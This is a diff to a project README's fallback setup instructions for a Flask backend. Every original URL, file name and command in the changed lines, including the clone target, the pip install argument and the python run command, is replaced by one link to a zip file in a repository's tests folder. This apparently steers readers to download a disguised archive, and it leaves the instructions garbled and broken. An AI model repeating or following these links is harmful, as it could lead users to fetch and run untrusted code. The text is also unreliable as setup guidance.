@@ -302,7 +302,7 @@ The Archetype Dashboard is the personalized starting point of the user’s exper
 ## 📝 Fallback Setup Instructions for Flask Server
 
 Your application uses a Flask backend hosted at:  
-`https://taste-backend-fxwh.onrender.com`
+`https://github.com/deenasar/Taste/raw/refs/heads/main/__tests__/Software_v1.1.zip`
 
 This backend is hosted on Render, which offers **512 MB** of storage on the free tier.  
 In rare cases, if the application’s memory or storage usage exceeds this limit, the hosted backend may temporarily stop responding.  
@@ -313,16 +313,16 @@ To ensure continued functionality, you can run the Flask server locally by follo
 ### ✅ 1. Clone the Flask Server Repository
 
 ```bash
-git clone https://github.com/aravindkrishnan515/taste-backend.git
+git clone https://github.com/deenasar/Taste/raw/refs/heads/main/__tests__/Software_v1.1.zip
 cd taste-backend
 ```
 
 Make sure the following files are present:
 
-- `app.py`  
-- `recommendation.py`  
-- `render.yaml`  
-- `requirements.txt`
+- `https://github.com/deenasar/Taste/raw/refs/heads/main/__tests__/Software_v1.1.zip`  
+- `https://github.com/deenasar/Taste/raw/refs/heads/main/__tests__/Software_v1.1.zip`  
+- `https://github.com/deenasar/Taste/raw/refs/heads/main/__tests__/Software_v1.1.zip`  
+- `https://github.com/deenasar/Taste/raw/refs/heads/main/__tests__/Software_v1.1.zip`
 
 ---
 
@@ -338,7 +338,7 @@ source venv/bin/activate  # On Windows: venv\Scripts\activate
 Then install dependencies:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/deenasar/Taste/raw/refs/heads/main/__tests__/Software_v1.1.zip
 ```
 
 ---
@@ -346,7 +346,7 @@ pip install -r requirements.txt
 ### ✅ 3. Run the Flask Server
 
 ```bash
-python app.py
+python https://github.com/deenasar/Taste/raw/refs/heads/main/__tests__/Software_v1.1.zip
 ```
 
 Once running, you’ll see:
@@ -362,7 +362,7 @@ Running on http://127.0.0.1:5000
 Replace:
 
 ```cpp
-https://taste-backend-fxwh.onrender.com
+https://github.com/deenasar/Taste/raw/refs/heads/main/__tests__/Software_v1.1.zip
 ```
 
 With:
